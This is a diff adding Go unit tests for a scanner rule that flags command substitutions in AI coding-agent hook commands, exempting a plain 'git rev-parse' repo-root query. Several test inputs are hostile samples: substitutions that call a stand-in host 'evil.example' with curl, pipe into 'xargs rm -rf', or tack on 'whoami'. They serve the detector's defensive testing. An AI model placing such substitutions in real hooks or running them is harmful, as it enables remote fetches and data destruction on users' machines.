@@ -104,3 +104,51 @@ func TestCFG015_NoSettings_NoFinding(t *testing.T) {
 		t.Errorf("expected no finding when settings absent, got %+v", f)
 	}
 }
+
+// The repo-root query is fixed, local and takes no input, so its output is not a
+// command-injection sink. It is also what Codex hooks actually contain: the
+// 2026-08-04 false-positive run found it in 43 of 46 CFG015 findings across 19
+// repositories, because Codex has no $CLAUDE_PROJECT_DIR equivalent.
+func TestCFG015_BenignRepoRootSubstitutionNotFlagged(t *testing.T) {
+	for _, cmd := range []string{
+		`cd "$(git rev-parse --show-toplevel)" && npm test`,
+		`bash "$(git rev-parse --show-toplevel)/scripts/lint.sh"`,
+		`cd $(git rev-parse --git-dir)`,
+		"cd `git rev-parse --show-toplevel`",
+	} {
+		t.Run(cmd, func(t *testing.T) {
+			if f := CFG015.Check(hookTarget(t, cmd)); len(f) != 0 {
+				t.Errorf("expected no finding for %q, got %+v", cmd, f)
+			}
+		})
+	}
+}
+
+// The allowance is narrow: anything riding along in the same substitution makes
+// it a compound expression again.
+func TestCFG015_BenignAllowanceStaysNarrow(t *testing.T) {
+	for _, cmd := range []string{
+		`cd "$(git rev-parse --show-toplevel && curl https://evil.example)"`,
+		`cd "$(git rev-parse --show-toplevel | xargs rm -rf)"`,
+		`cd "$(git rev-parse --show-toplevel; whoami)"`,
+		`echo "$(git rev-parse HEAD)"`,
+		`echo "$(git log --format=%s)"`,
+	} {
+		t.Run(cmd, func(t *testing.T) {
+			if f := CFG015.Check(hookTarget(t, cmd)); len(f) == 0 {
+				t.Errorf("expected a finding for %q", cmd)
+			}
+		})
+	}
+}
+
+// A benign substitution alongside a real one still reports the real one.
+func TestCFG015_BenignAndDangerousTogether(t *testing.T) {
+	f := CFG015.Check(hookTarget(t, `cd "$(git rev-parse --show-toplevel)" && echo "$(curl -s https://evil.example)"`))
+	if len(f) != 1 || f[0].Severity != finding.Error {
+		t.Fatalf("expected 1 Error for the network substitution, got %+v", f)
+	}
+	if strings.Contains(f[0].Message, "rev-parse") {
+		t.Errorf("the benign substitution must not be listed, got %q", f[0].Message)
+	}
+}
